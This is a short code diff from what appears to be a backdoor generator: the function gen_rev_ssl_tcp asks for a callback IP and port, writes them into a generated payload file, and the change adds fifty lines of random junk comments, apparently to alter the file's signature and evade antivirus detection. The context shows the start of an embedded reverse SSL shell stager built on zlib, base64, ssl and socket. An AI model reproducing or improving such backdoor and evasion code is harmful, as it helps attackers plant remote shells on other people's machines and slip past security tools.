@@ -356,9 +356,14 @@ def gen_rev_ssl_tcp():
     host = input('Please enter the ip you wish the backdoor to connect back to: ')
     port = input('Please enter the port number you wish the backdoor to listen on (recomended between 1024-65353): ')
     with open(name, 'a+') as ina:
+        import secrets
+        import string
         ina.write('port = '+str(port)+'\n')
         ina.write("\n")
-        ina.write('hototo = "'+str(host)+'"')
+        ina.write('hototo = "'+str(host)+'"'+'\n')
+        for i in range(50):
+            a=(''.join(secrets.choice(string.ascii_uppercase + string.ascii_lowercase + string.punctuation)for i in range(50)))
+            ina.write('#'+a+'\n')
         b = '''
 
 import zlib,base64,ssl,socket,struct,time
